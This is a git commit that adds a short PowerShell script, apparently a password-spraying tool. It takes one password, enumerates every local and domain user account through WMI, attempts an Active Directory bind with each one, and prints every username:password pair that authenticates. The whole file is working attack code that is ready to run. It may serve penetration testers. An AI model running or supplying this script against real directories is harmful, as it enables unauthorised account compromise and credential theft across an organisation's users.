4efb2d759c0fbec349b94779f28c23c3347b6274
Yuval Saban <62604022+YuvalSab@users.noreply.github.com>
2022-10-04 02:46:45 +0300

    Add files via upload

---
+++ Test-ADConnection.ps1
@@ -0,0 +1,18 @@
+Function Test-ADConnection {
+    param(
+        $username,
+        $password)   
+    return (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
+}
+$password = Read-Host 'Enter A Password'
+$Counter = 0 
+$total = (Get-WmiObject -Class Win32_UserAccount | Measure-Object).Count
+Get-WmiObject -Class Win32_UserAccount | ForEach-Object{
+    $UserName = $_.Caption
+    $auth = Test-ADConnection -username $UserName -password $password
+    if($auth -eq "True"){
+        Write-Host ("{0}:{1}" -f $UserName,$password)
+    }
+    Write-Progress -Activity "In Progress" -Status  "Completed:" -PercentComplete($Counter/$total*100)
+    $Counter++    
+}
